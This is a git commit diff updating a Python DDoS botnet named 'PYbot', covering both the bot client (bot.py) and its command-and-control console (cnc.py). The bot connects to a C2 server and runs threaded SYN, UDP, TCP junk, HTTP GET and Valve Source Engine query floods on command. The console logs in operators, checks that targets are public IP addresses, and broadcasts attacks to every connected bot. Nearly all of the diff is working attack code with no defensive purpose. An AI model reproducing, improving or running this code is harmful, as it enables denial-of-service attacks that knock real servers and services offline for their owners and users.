dea0ca4d3d8d91d684de7b7cc1c54ba697599d70
wodx <38795504+WodxTV@users.noreply.github.com>
2020-02-06 23:09:59 +0100

    Updated

--- bot.py
+++ bot.py
@@ -9,113 +9,156 @@ import time
 import random
 
 # Configuration
-HOST = '127.0.0.1'
-CNC_PORT = 101
+C2_ADDRESS  = '127.0.0.1'
+C2_PORT     = 101
 
+base_user_agents = [
+    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
+    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
+    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
+    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
+    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
+]
 
-user_agents = []
+def rand_ua():
+    return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())
 
-# read more at https://developer.valvesoftware.com/wiki/Server_queries
-def craft_vse_payload():
-    b = chr(0xFF) * 4
-    header = chr(0x54)
-    payload = 'Source Engine Query'
-    return str.encode(b + header + payload) # A2S_INFO packet
-
-def attack_vse(ip, secs):
-    payload = craft_vse_payload()
+def attack_vse(ip, port, secs):
+    payload = b'\xff\xff\xff\xffTSource Engine Query\x00' # read more at https://developer.valvesoftware.com/wiki/Server_queries
     while time.time() < secs:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.sendto(payload, (ip, 27015)) # 27015 -> default Valve Source Engine port
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.sendto(payload, (ip, port))
 
-def attack_udp(ip, secs, size):
+def attack_udp(ip, port, secs, size):
     while time.time() < secs:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.sendto(random._urandom(size), (ip, random.randint(1, 65535))) # ICMP destination unreachable as responses
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        dport = random.randint(1, 65535) if port == 0 else port
+        data = random._urandom(size)
+        s.sendto(data, (ip, dport))
 
-def attack_syn(ip, secs):
+def attack_tcp(ip, port, secs, size):
     while time.time() < secs:
-        sock = socket.socket()
-        sock.setblocking(0)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(2)
         try:
-            sock.connect((ip, random.randint(1, 65535))) # RST/ACK or SYN/ACK as response
+            s.connect((ip, port))
+            while time.time() < secs:
+                data = random._urandom(size)
+                s.send(data)
+        except:
+            pass
+
+def attack_syn(ip, port, secs):
+    while time.time() < secs:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.setblocking(0)
+        try:
+            dport = random.randint(1, 65535) if port == 0 else port
+            s.connect((ip, dport)) # RST/ACK or SYN/ACK as response
         except:
             pass
 
 def attack_http(ip, secs):
     while time.time() < secs:
-        sock = socket.socket()
-        sock.settimeout(2)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(2)
         try:
-            sock.connect((ip, 80))
-            sock.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(user_agents)}\r\nConnection: keep-alive\r\n'.encode())
-            sock.close()
+            s.connect((ip, 80))
+            s.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua()}\r\nConnection: keep-alive\r\n\r\n'.encode())
         except:
-            pass
+            s.close()
 
 def main():
-    sock = socket.socket()
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+    c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
 
     while 1:
         try:
-            sock.connect((HOST, CNC_PORT))
+            c2.connect((C2_ADDRESS, C2_PORT))
 
-            data = sock.recv(1024)
-            while not 'Username' in data.decode():
-                data = sock.recv(1024)
-            sock.send('BOT'.encode())
+            while 1:
+                data = c2.recv(1024).decode()
+                if 'Username' in data:
+                    c2.send('BOT'.encode())
+                    break
 
-            data = sock.recv(1024)
-            while not 'Password' in data.decode():
-                data = sock.recv(1024)
-            sock.send('ÿÿÿÿU'.encode())
+            while 1:
+                data = c2.recv(1024).decode()
+                if 'Password' in data:
+                    c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
+                    break
 
             break
         except:
-            time.sleep(120)
+            time.sleep(120) # retry in 2 mins if connection fails
 
     while 1:
         try:
-            data = sock.recv(1024).decode().strip()
+            data = c2.recv(1024).decode().strip()
             if not data:
                 break
 
             args = data.split(' ')
-            prefix = args[0].upper()
-            
-            if prefix == '.VSE':
+            command = args[0].upper()
+
+            print(data)
+
+            if command == '.VSE':
                 ip = args[1]
-                secs = time.time() + int(args[2])
+                port = int(args[2])
+                secs = time.time() + int(args[3])
+                threads = int(args[4])
 
-                threading.Thread(target=attack_vse, args=(ip, secs))
+                for _ in range(threads):
+                    threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()
 
-            elif prefix == '.UDP':
+            elif command == '.UDP':
                 ip = args[1]
-                secs = time.time() + int(args[2])
-                size = int(args[3])
+                port = int(args[2])
+                secs = time.time() + int(args[3])
+                size = int(args[4])
+                threads = int(args[5])
 
-                threading.Thread(target=attack_udp, args=(ip, secs, size))
+                for _ in range(threads):
+                    threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
 
-            elif prefix == '.SYN':
+            elif command == '.TCP':
                 ip = args[1]
-                secs = time.time() + int(args[2])
+                port = int(args[2])
+                secs = time.time() + int(args[3])
+                size = int(args[4])
+                threads = int(args[5])
 
-                threading.Thread(target=attack_syn, args=(ip, secs))
+                for _ in range(threads):
+                    threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
 
-            elif prefix == '.HTTP':
+            elif command == '.SYN':
                 ip = args[1]
-                secs = time.time() + int(args[2])
+                port = int(args[2])
+                secs = time.time() + int(args[3])
+                threads = int(args[4])
 
-                threading.Thread(target=attack_http, args=(ip, secs))
+                for _ in range(threads):
+                    threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
 
-            elif prefix == 'PING':
-                sock.send('PONG'.encode())
+            elif command == '.HTTP':
+                ip = args[1]
+                port = int(args[2])
+                secs = time.time() + int(args[3])
+                threads = int(args[4])
 
-        except:
+                for _ in range(threads):
+                    threading.Thread(target=attack_http, args=(ip, secs), daemon=True).start()
+
+            elif command == 'PING':
+                c2.send('PONG'.encode())
+
+        except Exception as e:
+            print(e)
             break
 
-    sock.close()
+    c2.close()
+
     main()
 
 if __name__ == '__main__':
--- cnc.py
+++ cnc.py
@@ -10,63 +10,74 @@ import time
 import ipaddress
 from colorama import Fore, init
 
-class Bot:
-    def __init__(self, connection, ip, port, protocol):
-        self.connection = connection
-        self.ip = ip
-        self.port = port
-        self.protocol = protocol
+# TODO: create a bot object
 
 bots = {}
 ansi_clear = '\033[2J\033[H'
 
 banner = '''
-               {0}██████{1}╗ {0}██{1}╗   {0}██{1}╗{0}██████{1}╗  {0}██████{1}╗ {0}████████{1}╗
-               {0}██{1}╔══{0}██{1}╗╚{0}██{1}╗ {0}██{1}╔╝{0}██{1}╔══{0}██{1}╗{0}██{1}╔═══{0}{0}██{1}╗╚══{0}██{1}╔══╝
-               {0}██████{1}╔╝ ╚{0}████{1}╔╝ {0}██████{1}╔╝{0}██{1}║   {0}██{1}║   {0}██{1}║   
-               {0}██{1}╔═══╝   ╚{0}██{1}╔╝  {0}██{1}╔══{0}██{1}╗{0}██{1}║   {0}██{1}║   {0}██{1}║   
-               {0}██{1}║        {0}██{1}║   {0}██████{1}╔╝╚{0}██████{1}╔╝   {0}██{1}║   
-               {1}╚═╝        ╚═╝   ╚═════╝  ╚═════╝    ╚═╝
-        '''.format(Fore.MAGENTA, Fore.LIGHTWHITE_EX)
+                    *********************************
+                    *         PYbot by wodx         *
+                    *    ready to launch attacks    *
+                    *********************************
+        '''
 
-def valid(ip):
-    groups = ip.split('.')
-    if len(groups) != 4 or any(not x.isdigit() for x in groups) or not all(0 <= int(part) < 256 for part in groups) or ipaddress.ip_address(ip).is_private:
-        return False
-    return True
+def validate_ip(ip):
+    """ validate IP-address """
+    parts = ip.split('.')
+    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private
     
+def validate_port(port, rand=False):
+    """ validate port number """
+    if rand:
+        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
+    else:
+        return port.isdigit() and int(port) >= 1 and int(port) <= 65535
+
+def validate_time(time):
+    """ validate attack duration """
+    return time.isdigit() and int(time) >= 10 and int(time) <= 1300
+
+def validate_size(size):
+    """ validate buffer size """
+    return size.isdigit() and int(size) > 1 and int(size) <= 65500
+
 def find_login(username, password):
-    for x in open('logins.txt').readlines():
-        x = x.strip()
-        if x.split(':')[0].lower() == username.lower() and x.split(':')[1] == password:
+    """ read credentials from logins.txt file """
+    credentials = [x.strip() for x in open('logins.txt').readlines() if x.strip()]
+    for x in credentials:
+        c_username, c_password = x.split(':')
+        if c_username.lower() == username.lower() and c_password == password:
             return True
 
 def send(socket, data, escape=True, reset=True):
+    """ send data to client or bot """
     if reset:
         data += Fore.RESET
     if escape:
         data += '\r\n'
-    socket.send(str.encode(data))
+    socket.send(data.encode())
 
 def broadcast(data):
+    """ send command to all bots """
     dead_bots = []
     for bot in bots.keys():
         try:
-            send(bot, data, False)
+            send(bot, f'{data} 32', False, False)
         except:
             dead_bots.append(bot)
-        
     for bot in dead_bots:
         bots.pop(bot)
         bot.close()
 
 def ping():
+    """ check if all bots are still connected to C2 """
     while 1:
         dead_bots = []
         for bot in bots.keys():
             try:
                 bot.settimeout(3)
-                send(bot, 'PING', False)
+                send(bot, 'PING', False, False)
                 if bot.recv(1024).decode() != 'PONG':
                     dead_bots.append(bot)
             except:
@@ -78,6 +89,7 @@ def ping():
         time.sleep(5)
 
 def update_title(client, username):
+    """ updates the shell title, duh? """
     while 1:
         try:
             send(client, f'\33]0;PYbot | Bots: {len(bots)} | Connected as: {username}\a', False)
@@ -89,7 +101,7 @@ def command_line(client):
     for x in banner.split('\n'):
         send(client, x)
 
-    prompt = f'{Fore.MAGENTA}PYbot {Fore.LIGHTWHITE_EX}$ '
+    prompt = f'{Fore.LIGHTBLUE_EX}PYbot {Fore.LIGHTWHITE_EX}$ '
     send(client, prompt, False)
 
     while 1:
@@ -99,90 +111,131 @@ def command_line(client):
                 continue
 
             args = data.split(' ')
-            prefix = args[0].upper()
+            command = args[0].upper()
             
-            if prefix == 'HELP' or prefix == '?':
+            if command == 'HELP':
                 send(client, 'HELP: Shows list of commands')
                 send(client, 'METHODS: Shows list of attack methods')
                 send(client, 'CLEAR: Clears the screen')
-                send(client, 'EXIT: Disconnects from CnC server')
+                send(client, 'LOGOUT: Disconnects from CnC server')
                 send(client, '')
 
-            elif prefix == 'METHODS':
+            elif command == 'METHODS':
                 send(client, '.syn: TCP SYN flood')
-                send(client, '.vse: Valve Source Engine specific flood')
-                send(client, '.udp: UDP flood')
+                send(client, '.tcp: TCP junk flood')
+                send(client, '.udp: UDP junk flood')
+                send(client, '.vse: UDP Valve Source Engine specific flood')
                 send(client, '.http: HTTP GET request flood')
                 send(client, '')
 
-            elif prefix == 'CLS' or prefix == 'CLEAR':
+            elif command == 'CLEAR':
                 send(client, ansi_clear, False)
                 for x in banner.split('\n'):
                     send(client, x)
 
-            elif prefix == 'EXIT' or prefix == 'LOGOUT':
+            elif command == 'LOGOUT':
                 send(client, 'Goodbye :-)')
                 time.sleep(1)
                 break
-
-            elif prefix == '.VSE':
-                if len(args) == 3:
-                    ip = args[1]
-                    secs = args[2]
-                    if valid(ip):
-                        if secs.isdigit() and int(secs) >= 10 and int(secs) <= 1300:
-                            send(client, Fore.GREEN + f'Attack was sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
-                            broadcast(data)
-                        else:
-                            send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
-                    else:
-                        send(client, Fore.RED + 'Invalid IP-address')
-                else:
-                    send(client, 'Usage: .vse [IP] [TIME]')
-                                 
-            elif prefix == '.SYN':
-                if len(args) == 3:
-                    ip = args[1]
-                    secs = args[2]
-                    if valid(ip):
-                        if secs.isdigit() and int(secs) >= 10 and int(secs) <= 1300:
-                            send(client, Fore.GREEN + f'Attack was sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
-                            broadcast(data)
-                        else:
-                            send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
-                    else:
-                        send(client, Fore.RED + 'Invalid IP-address')
-                else:
-                    send(client, 'Usage: .syn [IP] [TIME]')
-
-            # UDP attack vector
-            elif prefix == '.UDP':
+            
+            # Valve Source Engine query flood
+            elif command == '.VSE':
                 if len(args) == 4:
                     ip = args[1]
-                    secs = args[2]
-                    size = args[3]
-                    if valid(ip):
-                        if secs.isdigit() and int(secs) >= 10 and int(secs) <= 1300:
-                            if size.isdigit() and int(size) >= 64 and int(size) <= 65500:
-                                send(client, Fore.GREEN + f'Attack was sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
+                    port = args[2]
+                    secs = args[3]
+                    if validate_ip(ip):
+                        if validate_port(port):
+                            if validate_time(secs):
+                                send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                 broadcast(data)
                             else:
-                                send(client, Fore.RED + 'Invalid packet size (64-65500 bytes)')
+                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                         else:
-                            send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
+                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                     else:
                         send(client, Fore.RED + 'Invalid IP-address')
                 else:
-                    send(client, 'Usage: .udp [IP] [TIME] [SIZE]')
+                    send(client, 'Usage: .vse [IP] [PORT] [TIME]')
 
-            # HTTP GET attack vector
-            elif prefix == '.HTTP':
+            # TCP SYNchronize flood           
+            elif command == '.SYN':
+                if len(args) == 4:
+                    ip = args[1]
+                    port = args[2]
+                    secs = args[3]
+                    if validate_ip(ip):
+                        if validate_port(port, True):
+                            if validate_time(secs):
+                                send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
+                                broadcast(data)
+                            else:
+                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
+                        else:
+                            send(client, Fore.RED + 'Invalid port number (1-65535)')
+                    else:
+                        send(client, Fore.RED + 'Invalid IP-address')
+                else:
+                    send(client, 'Usage: .syn [IP] [PORT] [TIME]')
+                    send(client, 'Use port 0 for random port mode')
+                    
+            # TCP junk data packets flood
+            elif command == '.TCP':
+                if len(args) == 5:
+                    ip = args[1]
+                    port = args[2]
+                    secs = args[3]
+                    size = args[4]
+                    if validate_ip(ip):
+                        if validate_port(port):
+                            if validate_time(secs):
+                                if validate_size(size):
+                                    send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
+                                    broadcast(data)
+                                else:
+                                    send(client, Fore.RED + 'Invalid packet size (1-65500 bytes)')
+                            else:
+                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
+                        else:
+                            send(client, Fore.RED + 'Invalid port number (1-65535)')
+                    else:
+                        send(client, Fore.RED + 'Invalid IP-address')
+                else:
+                    send(client, 'Usage: .tcp [IP] [PORT] [TIME] [SIZE]')
+
+            # UDP junk data packets flood
+            elif command == '.UDP':
+                if len(args) == 5:
+                    ip = args[1]
+                    port = args[2]
+                    secs = args[3]
+                    size = args[4]
+                    if validate_ip(ip):
+                        if validate_port(port, True):
+                            if validate_time(secs):
+                                if validate_size(size):
+                                    send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
+                                    broadcast(data)
+                                else:
+                                    send(client, Fore.RED + 'Invalid packet size (1-65500 bytes)')
+                            else:
+                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
+                        else:
+                            send(client, Fore.RED + 'Invalid port number (1-65535)')
+                    else:
+                        send(client, Fore.RED + 'Invalid IP-address')
+                else:
+                    send(client, 'Usage: .udp [IP] [PORT] [TIME] [SIZE]')
+                    send(client, 'Use port 0 for random port mode')
+
+            # HTTP GET request flood
+            elif command == '.HTTP':
                 if len(args) == 3:
                     ip = args[1]
                     secs = args[2]
-                    if valid(ip):
-                        if secs.isdigit() and int(secs) >= 10 and int(secs) <= 1300:
-                            send(client, Fore.GREEN + f'Attack was sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
+                    if validate_ip(ip):
+                        if validate_time(secs):
+                            send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                             broadcast(data)
                         else:
                             send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
@@ -190,7 +243,6 @@ def command_line(client):
                         send(client, Fore.RED + 'Invalid IP-address')
                 else:
                     send(client, 'Usage: .http [IP] [TIME]')
-
             else:
                 send(client, Fore.RED + 'Unknown Command')
 
@@ -200,13 +252,12 @@ def command_line(client):
     client.close()
 
 def handle_client(client, address):
-
     send(client, f'\33]0;PYbot | Login\a', False)
 
     # username login
     while 1:
         send(client, ansi_clear, False)
-        send(client, f'{Fore.MAGENTA}Username{Fore.LIGHTWHITE_EX}: ', False)
+        send(client, f'{Fore.LIGHTBLUE_EX}Username{Fore.LIGHTWHITE_EX}: ', False)
         username = client.recv(1024).decode().strip()
         if not username:
             continue
@@ -216,15 +267,15 @@ def handle_client(client, address):
     password = ''
     while 1:
         send(client, ansi_clear, False)
-        send(client, f'{Fore.MAGENTA}Password{Fore.LIGHTWHITE_EX}:{Fore.BLACK} ', False, False)
-        while not password.strip():
-            password = client.recv(1024).decode().strip()
+        send(client, f'{Fore.LIGHTBLUE_EX}Password{Fore.LIGHTWHITE_EX}:{Fore.BLACK} ', False, False)
+        while not password.strip(): # i know... this is ugly...
+            password = client.recv(1024).decode('cp1252').strip()
         break
- 
-    if password != 'ÿÿÿÿU':
+        
+    # handle client
+    if password != '\xff\xff\xff\xff\75':
         send(client, ansi_clear, False)
 
-        # handle client
         if not find_login(username, password):
             send(client, Fore.RED + 'Invalid credentials')
             time.sleep(1)
@@ -233,23 +284,24 @@ def handle_client(client, address):
 
         threading.Thread(target=update_title, args=(client, username)).start()
         threading.Thread(target=command_line, args=[client]).start()
-        return
 
     # handle bot
-    for x in bots.values():
-        if x[0] == address[0]:
-            client.close()
-            return
-    bots.update({client: address})
+    else:
+        # check if bot is already connected
+        for x in bots.values():
+            if x[0] == address[0]:
+                client.close()
+                return
+        bots.update({client: address})
     
 def main():
     if len(sys.argv) != 2:
-        print(f'Usage: python {sys.argv[0]} <cnc port>')
+        print(f'Usage: python {sys.argv[0]} <c2 port>')
         exit()
 
     port = sys.argv[1]
     if not port.isdigit() or int(port) < 1 or int(port) > 65535:
-        print('Invalid CnC port')
+        print('Invalid C2 port')
         exit()
     port = int(port)
     
@@ -261,13 +313,15 @@ def main():
     
     try:
         sock.bind(('0.0.0.0', port))
-        sock.listen()
     except:
-        print('Couldn\'t bind port')
+        print('Failed to bind port')
         exit()
 
-    threading.Thread(target=ping).start()
+    sock.listen()
 
+    threading.Thread(target=ping).start() # start keepalive thread
+
+    # accept all connections
     while 1:
         threading.Thread(target=handle_client, args=[*sock.accept()]).start()
 
